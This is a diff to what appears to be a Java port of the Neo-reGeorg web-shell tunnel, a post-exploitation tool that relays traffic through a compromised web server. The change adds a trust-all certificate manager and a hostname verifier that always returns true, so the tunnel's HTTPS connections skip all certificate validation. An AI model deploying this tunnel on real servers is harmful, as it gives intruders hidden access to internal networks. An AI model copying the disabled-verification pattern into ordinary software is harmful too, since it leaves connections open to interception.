@@ -12,6 +12,9 @@ import java.nio.channels.SocketChannel;
 import java.util.Collections;
 import java.util.Enumeration;
 import java.util.List;
+import java.security.cert.CertificateException;
+import java.security.cert.X509Certificate;
+import javax.net.ssl.*;
 
 /**
  * @Modifier c0ny1, L
@@ -19,9 +22,10 @@ import java.util.List;
  * @Description 将Neo-reGeorg jsp服务端改为java代码，提高兼容性
  */
 
-public class NeoreGeorg {
+public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
     private char[] en;
     private byte[] de;
+
 
     @Override
     public boolean equals(Object obj) {
@@ -61,11 +65,19 @@ public class NeoreGeorg {
             if (rUrl != null) {
                 rUrl = new String(b64de(rUrl));
                 if (!islocal(rUrl)){
-                    // ssl verify is not ignored
                     response.reset();
                     String method = request.getMethod();
                     URL u = new URL(rUrl);
                     HttpURLConnection conn = (HttpURLConnection) u.openConnection();
+
+                    // ignore ssl verify
+                    if (HttpsURLConnection.class.isInstance(conn)){
+                        ((HttpsURLConnection)conn).setHostnameVerifier(this);
+                        SSLContext ctx = SSLContext.getInstance("SSL");
+                        ctx.init(null, new TrustManager[] { this }, null);
+                        ((HttpsURLConnection)conn).setSSLSocketFactory(ctx.getSocketFactory());
+                    }
+
                     conn.setRequestMethod(method);
                     conn.setDoOutput(true);
 
@@ -230,6 +242,7 @@ public class NeoreGeorg {
         return false;
     }
 
+
     public String b64en(byte[] data) {
         StringBuffer sb = new StringBuffer();
         int len = data.length;
@@ -311,6 +324,7 @@ public class NeoreGeorg {
         return buf.toByteArray();
     }
 
+
     static String headerkey(String str) throws Exception {
         String out = "";
         for (String block: str.split("-")) {
@@ -319,6 +333,7 @@ public class NeoreGeorg {
         }
         return out.substring(0, out.length() - 1);
     }
+
 
     boolean islocal(String url) throws Exception {
         String ip = (new URL(url)).getHost();
@@ -334,5 +349,25 @@ public class NeoreGeorg {
             }
         }
         return false;
+    }
+
+
+    public boolean verify(String s, SSLSession sslSession) {
+        return true;
+    }
+
+
+    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
+
+    }
+
+
+    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
+
+    }
+
+
+    public X509Certificate[] getAcceptedIssuers() {
+        return new X509Certificate[0];
     }
 }
